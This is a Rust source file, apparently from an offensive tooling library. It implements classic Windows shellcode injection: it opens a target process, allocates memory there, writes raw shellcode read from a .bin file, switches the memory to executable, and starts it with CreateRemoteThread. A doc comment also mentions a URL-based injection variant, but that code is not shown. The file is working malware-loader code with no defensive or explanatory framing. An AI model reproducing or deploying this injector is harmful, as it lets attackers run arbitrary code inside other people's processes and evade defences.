use std::path::Path;

use windows::Win32::Foundation::CloseHandle;
use windows::Win32::System::Diagnostics::Debug::WriteProcessMemory;
use windows::Win32::System::Memory::{
    MEM_COMMIT, MEM_RELEASE, MEM_RESERVE, PAGE_EXECUTE_READWRITE, PAGE_READWRITE, VirtualAllocEx,
    VirtualFreeEx, VirtualProtectEx,
};
use windows::Win32::System::Threading::{
    CreateRemoteThread, OpenProcess, PROCESS_CREATE_THREAD, PROCESS_QUERY_INFORMATION,
    PROCESS_VM_OPERATION, PROCESS_VM_READ, PROCESS_VM_WRITE,
};

use crate::error::MiscError;

/// Inject raw shellcode bytes into a target process using the classic technique.
///
/// `OpenProcess` -> `VirtualAllocEx(RW)` -> `WriteProcessMemory` ->
/// `VirtualProtectEx(RWX)` -> `CreateRemoteThread`
///
/// This is the shared injection core used by both file-based and URL-based injection.
pub(crate) fn inject_shellcode_bytes(pid: u32, shellcode: &[u8]) -> Result<(), MiscError> {
    if shellcode.is_empty() {
        return Err(MiscError::FileReadFailed(
            "Shellcode is empty".to_string(),
        ));
    }

    unsafe {
        // Open target process with required permissions
        let process_handle = OpenProcess(
            PROCESS_CREATE_THREAD
                | PROCESS_QUERY_INFORMATION
                | PROCESS_VM_OPERATION
                | PROCESS_VM_READ
                | PROCESS_VM_WRITE,
            false,
            pid,
        )
        .map_err(|_| MiscError::OpenProcessFailed(pid))?;

        // Allocate memory in target process with RW permissions
        let remote_mem = VirtualAllocEx(
            process_handle,
            Some(std::ptr::null()),
            shellcode.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );

        if remote_mem.is_null() {
            let _ = CloseHandle(process_handle);
            return Err(MiscError::AllocFailed);
        }

        // Write shellcode into the allocated memory
        let write_result = WriteProcessMemory(
            process_handle,
            remote_mem,
            shellcode.as_ptr() as *const _,
            shellcode.len(),
            None,
        );

        if write_result.is_err() {
            let _ = VirtualFreeEx(process_handle, remote_mem, 0, MEM_RELEASE);
            let _ = CloseHandle(process_handle);
            return Err(MiscError::WriteFailed);
        }

        // Change memory protection to executable (RWX)
        let mut old_protection = PAGE_READWRITE;
        let protect_result = VirtualProtectEx(
            process_handle,
            remote_mem,
            shellcode.len(),
            PAGE_EXECUTE_READWRITE,
            &mut old_protection,
        );

        if protect_result.is_err() {
            let _ = VirtualFreeEx(process_handle, remote_mem, 0, MEM_RELEASE);
            let _ = CloseHandle(process_handle);
            return Err(MiscError::VirtualProtectFailed);
        }

        // Execute shellcode via CreateRemoteThread
        let thread_start: unsafe extern "system" fn(*mut std::ffi::c_void) -> u32 =
            std::mem::transmute(remote_mem);

        let thread_handle = CreateRemoteThread(
            process_handle,
            None,
            0,
            Some(thread_start),
            Some(std::ptr::null_mut()),
            0,
            None,
        )
        .map_err(|_| {
            let _ = VirtualFreeEx(process_handle, remote_mem, 0, MEM_RELEASE);
            let _ = CloseHandle(process_handle);
            MiscError::CreateRemoteThreadFailed
        })?;

        let _ = CloseHandle(thread_handle);
        let _ = CloseHandle(process_handle);

        Ok(())
    }
}

/// Inject raw shellcode into a target process from a .bin file.
///
/// Reads shellcode from disk and injects using the classic technique.
///
/// # Arguments
/// * `pid` - Target process ID
/// * `shellcode_path` - Path to raw shellcode .bin file
pub fn inject_shellcode_classic(pid: u32, shellcode_path: &str) -> Result<(), MiscError> {
    let path = Path::new(shellcode_path);
    if !path.exists() {
        return Err(MiscError::FileNotFound(shellcode_path.to_string()));
    }

    let shellcode =
        std::fs::read(path).map_err(|_| MiscError::FileReadFailed(shellcode_path.to_string()))?;

    inject_shellcode_bytes(pid, &shellcode)
}
